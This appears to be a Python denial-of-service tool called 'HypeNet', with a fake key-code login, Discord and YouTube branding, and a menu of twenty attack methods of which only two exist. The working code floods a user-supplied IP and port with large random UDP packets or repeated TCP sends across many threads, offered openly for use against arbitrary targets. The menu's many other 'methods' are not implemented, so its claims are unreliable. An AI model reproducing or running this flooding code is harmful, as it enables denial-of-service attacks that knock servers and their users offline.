import random
import socket
import threading
import os
import time
import sys
#Note: Before Code This Shit Don't Forget Too Listen Queen Albums.

print("\u001b[36;1m╔═════HypeNet@\u001b[37;1mKeyCode")
username = input("\u001b[36;1m╚═════════>>\u001b[37;1m ")
if username == 'Premium':
     print("[!]: We didn't found this username!")

else : 
     print("[!]: Probably This User/Key Already Expaired?!")
     time.sleep(3)
     print("[!]: Closing.")
     time.sleep(2)
     os.system(quit)

print("\u001b[36;1m╔═════HypeNet@\u001b[37;1mKeyCode")
keycode = input("\u001b[36;1m╚═════════>>\u001b[37;1m ")
if keycode == '123456':
     print("[!]: The Key Are Vaild.")
os.system("cls")

os.system("cls")
print("""
                                    
                                           \u001b[34;1m╦ ╦  ╦ ╦  ╔═╗  ╔═╗  \u001b[36;1m╔╗╔  ╔═╗  ╔╦╗
                                           \u001b[34;1m╠═╣  ╚╦╝  ╠═╝  ║╣   \u001b[36;1m║║║  ║╣    ║ 
                                          \u001b[34;1m ╩ ╩   ╩   ╩    ╚═╝  \u001b[36;1m╝╚╝  ╚═╝   ╩    
                                   \u001b[37;1m╔══════════════════════════════════════════════╗
                                   \u001b[37;1m║    Join Discord : \u001b[36;1mdiscord.gg/hypecloud\u001b[37;1m       ║
                                   \u001b[37;1m║    Youtube      : \u001b[36;1mradzmy\u001b[37;1m                     ║
                     ╔═════════════╩══════════════════════════════════════════════╩══════════════╗
                     ║ - - - - - - - - - - - - - - - INFO ACCOUNT! - - - - - - - - - - - - - - - ║
               \u001b[37;1m╔═════╩═══════════════════════════════════════════════════════════════════════════╩═════╗
               ║ Username     : \u001b[36;1mPremium\u001b[37;1m                                                                ║
               ║ Key-Code     : \u001b[36;1m""" +  (str(keycode)) + """ \u001b[37;1mDo Not Share ur code!                                           ║
               ║ Status-Key   : \u001b[36;1mActived\u001b[37;1m                                                                ║  
               ║ Subscription : \u001b[36;1mPremium\u001b[37;1m                                                                ║  
               ║ Date/Time    :                                                                        ║
               ╚═══════════════════════════════════════════════════════════════════════════════════════╝
""")
print("╔═════HypeNet@IP")
ip = str(input("╠════════>> "))
print("╠═════Hype@Port")
port = int(input("╚═════════>> "))
os.system("cls")
os.system("color b")
print("""
                                             \u001b[37;1m╔╦╗  ╔═╗  ╔╦╗  ╦ ╦  ╔═╗  ╔╦╗
                                             \u001b[37;1m║║║  ║╣    ║   ╠═╣  ║ ║   ║║
                                             \u001b[37;1m╩ ╩  ╚═╝   ╩   ╩ ╩  ╚═╝  ═╩╝
                      \u001b[36;1m╔═══════════════════════════════════════════════════════════════════════════╗
                      ║  - - - - - - - - - Version: \u001b[37;1m1.07 Last Update 7/24/2021\u001b[36;1m - - - - - - - - -  ║
                      ║  - - - - - - - - - Discord: \u001b[37;1mHyperux#2384\u001b[36;1m               - - - - - - - - -  ║
                      ║  - - - - - - - - - Youtube: \u001b[37;1mradzmy\u001b[36;1m                     - - - - - - - - -  ║ 
                 ╔════╩═══════════════════════════════════════════════════════════════════════════╩════╗
                 ╚════╦═══════════════════════════════════════════════════════════════════════════╦════╝
                      ║  IP Target: \u001b[37;1m"""  + (str(ip))  + """\u001b[36;1m                                      IP Port: \u001b[37;1m""" + (str(port)) + """\u001b[36;1m ║
               \u001b[36;1m╔══════╩══════════════╦═════════════════════╦═══════════════════════╦══════════════╩═════╗
               \u001b[36;1m║ [1] \u001b[37;1mUDP-FLOOD\u001b[36;1m       ║ [6] \u001b[37;1mOVH-BYPASS\u001b[36;1m      ║ [11] \u001b[37;1mVPS-FREEZE\u001b[36;1m       ║ [16] \u001b[37;1mICMP\u001b[36;1m          ║
               \u001b[36;1m║ [2] \u001b[37;1mTCP-FLOOD\u001b[36;1m       ║ [7] \u001b[37;1mOVH-REQUEST\u001b[36;1m     ║ [12] \u001b[37;1mPROXY-SPAM\u001b[36;1m       ║ [17] \u001b[37;1mPACKET-D1\u001b[36;1m     ║
               \u001b[36;1m║ [3] \u001b[37;1mHTTP-FLOOD\u001b[36;1m      ║ [8] \u001b[37;1mNFO-D1\u001b[36;1m          ║ [13] \u001b[37;1mSOCKS-SPAM\u001b[36;1m       ║ [18] \u001b[37;1mGTPS-D2\u001b[36;1m       ║
               \u001b[36;1m║ [4] \u001b[37;1mSYN-FLOOD\u001b[36;1m       ║ [9] \u001b[37;1mICPAMP\u001b[36;1m          ║ [14] \u001b[37;1mUDP-RAW\u001b[36;1m          ║ [19] \u001b[37;1mGTPS-LAG\u001b[36;1m      ║
               \u001b[36;1m║ [5] \u001b[37;1mDNS-FLOOD\u001b[36;1m       ║ [10] \u001b[37;1mGTPS-D1\u001b[36;1m        ║ [15] \u001b[37;1mRANDOM-D1\u001b[36;1m        ║ [20] \u001b[37;1mDEATH-SAMP\u001b[36;1m    ║
               \u001b[36;1m╚═════════════════════╩═════════════════════╩═══════════════════════╩════════════════════╝
""")
print("\u001b[36;1m╔═════HypeNet\u001b[37;1m@Method")
choice = str(input("\u001b[36;1m╠═════════>>\u001b[37;1m "))
print("\u001b[36;1m╠═════HypeNet\u001b[37;1m@Boost")
times = int(input("\u001b[36;1m╠═════════>>\u001b[37;1m "))
print("\u001b[36;1m╠═════HypeNet\u001b[37;1m@Thread")
threads = int(input("\u001b[36;1m╚═════════>>\u001b[37;1m "))

def run1(): #Udp-flood
	data = random._urandom(60000)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			
		except:
			print()

def run2(): #TCP FLOOD
	data = random._urandom(102400) #10240 10425 600000
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
                
				s.send(data)
		except:
            
		    s.close()	

os.system("cls")
os.system("color c")
print ("""
                                           ╔═════════════════════════════════╗
                                           ║     Sucessfully To Attack!      ║ 
                                           ╚═════════════════════════════════╝
""")
time.sleep(5)
os.system("cls")
os.system("color d")

print("""
                                        ╔═════════════════════════════════════════════╗
                                        ║               Attacking Info.               ║
                                        ║═════════════════════════════════════════════║ 
                                        ║ Attacking IP   : """ + (str(ip))  + """             ║ 
                                        ║ Attacking PORT : """ + (str(port)) + """                         ║       
                                        ╚═════════════════════════════════════════════╝
""")

#Chocie Method Here and dont being idiot asf
for y in range(threads):
	if choice == '1':
		th = threading.Thread(target = run1)
		th.start()
	else:
         th = threading.Thread(target = run2)
         th.start()